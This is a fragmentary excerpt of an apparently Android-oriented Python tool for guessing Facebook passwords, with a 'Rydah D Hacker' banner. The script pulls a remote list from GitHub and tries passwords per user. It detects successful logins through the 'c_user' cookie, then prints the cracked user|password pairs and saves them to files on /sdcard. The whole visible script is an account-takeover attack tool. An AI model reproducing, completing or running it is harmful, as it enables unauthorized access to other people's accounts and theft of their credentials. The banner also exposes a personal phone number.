...
def main_apv():
    ...
    r1=requests.get("https://github.com/mazahirabbas/jimy/blob/main/z.txt").text
...
........:::..:::::..::........:::.......::::......:::..:::::..:::::
 ...
 [$]~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~[$]
    ...
    Author   : Rydah D Hacker

    Facebook : facebook.com/RydahMan

    Connect  : +2349017624430
...
class __xxx__:
        ...
        try:
            ...
            for pw in __chi__:
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    print(f"\r{H} [Rydah-ok 🤫] {user} | {pw}")

                    wrt = '%s|%s' % (user,pw)

                    ok.append(wrt)

                    open('/sdcard/Rydah_OK.txt' , 'a').write('%s\n' % wrt)
                    ...
                    try:
                        ...
                        open('/sdcard/Rydah_CP.txt' , 'a').write('%s\n' % wrt)
    ...
    def __pler__(self):
        ...
        if chi == '':
            ...
            print("\033[1;32m      MR RYDAH HACKER😊 \033[1;37m")
